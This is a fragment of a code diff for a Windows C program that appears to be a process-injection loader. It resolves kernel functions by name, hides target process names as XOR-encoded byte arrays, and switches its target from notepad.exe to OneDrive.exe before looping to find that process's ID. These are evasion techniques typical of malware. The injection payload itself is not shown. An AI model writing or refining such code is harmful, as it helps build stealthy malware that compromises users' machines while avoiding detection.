@@ -18,12 +18,15 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     PopulateKernelFunctionPtrsByName(hKernel);
 
     char cNotepad[] = {0x5e, 0x5f, 0x44, 0x55, 0x40, 0x51, 0x54, 0x1e, 0x55, 0x48, 0x55, 0x0};
-    MyXor(cNotepad, 11, key, 5);
+    MyXor(cNotepad, 11, key, key_len);
+
+    char cOneDrive[] = {0x7f, 0x5e, 0x55, 0x74, 0x42, 0x59, 0x46, 0x55, 0x1e, 0x55, 0x48, 0x55, 0x0};
+    MyXor(cOneDrive, 12, key, key_len);
 
     DWORD dwProcID = -1;
     while (1)
     {
-        dwProcID = FindTargetProcessID(cNotepad);
+        dwProcID = FindTargetProcessID(cOneDrive);
 
         if (dwProcID != -1)
             break;
